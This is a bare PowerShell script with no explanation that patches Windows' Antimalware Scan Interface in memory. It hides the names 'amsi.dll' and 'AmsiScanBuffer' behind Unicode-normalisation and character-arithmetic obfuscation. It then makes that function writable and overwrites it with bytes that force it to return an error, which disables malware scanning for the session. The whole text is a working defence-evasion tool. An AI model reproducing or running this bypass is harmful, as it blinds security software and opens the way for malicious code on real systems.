$jKM4QktjvwyBqBf7SQv = @"
using System;
using System.Runtime.InteropServices;
public class jKM4QktjvwyBqBf7SQv {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr cTwZS1jzg6PXVxz0FAJU, string rti5B2q);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr VQ2zbSwy, UIntPtr mTHZRH, uint FTo06VDnl, out uint PtB9H);
}
"@

Add-Type $jKM4QktjvwyBqBf7SQv

$TVxXUA7zVVFq5dLB = [jKM4QktjvwyBqBf7SQv]::LoadLibrary("$(('ãm'+'sì'+'.d'+'ll').NoRMAlIzE([ChAr](70*67/67)+[cHAR]([BYTE]0x6f)+[char]([bytE]0x72)+[cHAR]([ByTe]0x6d)+[chAr](68*19/19)) -replace [chAR](92)+[cHaR](112+19-19)+[cHar](123*100/100)+[CHAr](77*6/6)+[ChAr](110*46/46)+[chAR]([BYTE]0x7d))")
$WiZPrjlnd25Q4dc1rs = [jKM4QktjvwyBqBf7SQv]::GetProcAddress($TVxXUA7zVVFq5dLB, "$(('ÁmsìScänBûff'+'èr').NoRMAlIzE([ChaR](70+13-13)+[ChAR]([Byte]0x6f)+[ChAR](114)+[CHAR]([BYte]0x6d)+[CHaR]([bYtE]0x44)) -replace [chAr](57+35)+[cHar]([byTE]0x70)+[chaR](123)+[cHAR]([ByTe]0x4d)+[ChAR](17+93)+[chAR]([bytE]0x7d))")
$p = 0
[jKM4QktjvwyBqBf7SQv]::VirtualProtect($WiZPrjlnd25Q4dc1rs, [uint32]5, 0x40, [ref]$p)
$DO9oKnMWfJb62jx = "0xB8"
$H9OuPNU = "0x57"
$UPkUaVJRa = "0x00"
$Js7BA9s3u8wO = "0x07"
$VpB4 = "0x80"
$d9rPgB0a3T4QjiM = "0xC3"
$CjEVR9bs1 = [Byte[]] ($DO9oKnMWfJb62jx,$H9OuPNU,$UPkUaVJRa,$Js7BA9s3u8wO,+$VpB4,+$d9rPgB0a3T4QjiM)
[System.Runtime.InteropServices.Marshal]::Copy($CjEVR9bs1, 0, $WiZPrjlnd25Q4dc1rs, 6)